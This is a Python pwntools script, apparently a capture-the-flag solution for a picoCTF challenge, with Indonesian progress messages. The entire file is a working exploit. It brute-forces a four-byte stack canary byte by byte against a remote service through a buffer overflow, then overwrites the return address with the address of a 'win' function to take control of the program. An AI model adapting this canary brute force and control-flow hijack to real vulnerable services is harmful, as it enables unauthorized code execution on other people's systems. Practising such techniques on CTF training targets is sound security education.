from pwn import *
import sys

context.log_level = 'error'

HOST = 'saturn.picoctf.net'
PORT = 53953

canary = b''
offset_to_canary = 64 

print("[*]Brute-Force Canary...")

for i in range(1, 5): 
    for guess in range(256):
        sys.stdout.write(f"\r[*]Coba byte ke-{i} | Tebakan: {chr(guess) if 32 <= guess <= 126 else '?'} (hex: {hex(guess)})  ")
        sys.stdout.flush()
        
        try:
            io = remote(HOST, PORT, fam="ipv4", timeout=3)

            panjang = offset_to_canary + len(canary) + 1
            io.sendlineafter(b'> ', str(panjang).encode(), timeout=2)
            
            payload = b'A' * offset_to_canary + canary + bytes([guess])
            io.sendafter(b'Input> ', payload, timeout=2)
            
            response = io.recvall(timeout=2)
            
            if b"Where's the Flag?" in response or b"Ok..." in response:
                print(f"\n[+] BENAR! Byte ke-{i} ketemu: {chr(guess)} (hex: {hex(guess)})\n")
                canary += bytes([guess])
                io.close()
                break             
        except Exception:
            pass
        io.close()

if len(canary) != 4:
    print("\n[!] Gagal menemukan Canary!")
    sys.exit()
print(f"\n[+] Canary : {canary}")

io = remote(HOST, PORT, fam="ipv4")
elf = ELF('./vuln')
win_addr = elf.sym['win']

payload  = b'A' * offset_to_canary      
payload += canary                       
payload += b'B' * 16                    
payload += p32(win_addr) * 4            

io.sendlineafter(b'> ', str(len(payload)).encode())
io.sendafter(b'Input> ', payload)

print("\n[*] HASIL:")
print(io.recvall(timeout=3).decode('utf-8', 'ignore'))
